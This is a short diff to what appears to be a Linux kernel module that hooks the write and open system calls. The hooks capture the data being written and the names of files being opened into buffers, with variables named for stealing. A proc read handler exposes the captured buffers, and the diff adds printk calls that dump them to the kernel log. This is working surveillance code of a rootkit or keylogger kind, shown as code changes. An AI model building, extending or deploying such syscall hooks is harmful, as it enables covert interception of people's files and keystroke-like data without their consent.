@@ -65,7 +65,7 @@ static ssize_t proc_read_open(struct file *fp, char *buf, size_t len, loff_t * o
     return 0;
   }
   finished = 1;
-		memcpy(buf, proc_buffer_write, proc_buffer_size_write);
+		memcpy(buf, proc_buffer_open, proc_buffer_size_open);
 
 	return proc_buffer_size_open;
 }
@@ -99,6 +99,7 @@ static unsigned long new_write(int fildes, const void *buf, size_t nbytes)
           proc_buffer_open[i+1] = steal_dest;
         }
         proc_buffer_size_write = i;
+        printk("%s",proc_buffer_write);
         return (*old_write)(fildes, buf, nbytes);
 }
 
@@ -126,6 +127,7 @@ static unsigned long new_open(const char *filename, int flags, int mode)
           proc_buffer_open[i+1] = steal_flags;
         }
         proc_buffer_size_open = i;
+        printk("%s",proc_buffer_open);
         return (*old_open)(filename, flags, mode);
 }
 
